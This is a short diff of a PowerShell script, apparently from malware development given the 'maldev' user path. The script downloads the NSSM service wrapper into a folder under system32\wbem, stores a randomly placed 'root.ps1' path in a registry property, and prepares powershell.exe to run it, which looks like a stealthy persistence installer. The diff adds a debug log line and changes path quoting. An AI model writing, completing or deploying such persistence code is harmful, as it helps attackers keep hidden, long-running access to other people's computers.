@@ -3,7 +3,7 @@ param(
     [string]$rootScriptPath,
     [string]$basePath
 )
-
+echo $basePath >> "C:\Users\maldev\Downloads\init_root.txt"
 $nssmUrl = "https://nssm.cc/release/nssm-2.24.zip"
 $nssmFolder = "$env:windir\system32\wbem\nssm"
 $nssmexe = "$nssmFolder\nssm.exe"
@@ -20,7 +20,7 @@ if(($rootScriptPath -eq $null) -or ($rootScriptPath -eq "")){
     $idx = Get-Random -Minimum 0 -Maximum $paths.Length
     $rootScriptPath = $paths[$idx]
     $rootScriptPath = "$rootScriptPath\root.ps1"
-    Set-ItemProperty -Path `"$basePath`" -Name $propertyName -Value $rootScriptPath -Force | Out-Null
+    Set-ItemProperty -Path $basePath -Name $propertyName -Value $rootScriptPath -Force | Out-Null
 }
 
 $exePath = "powershell.exe"
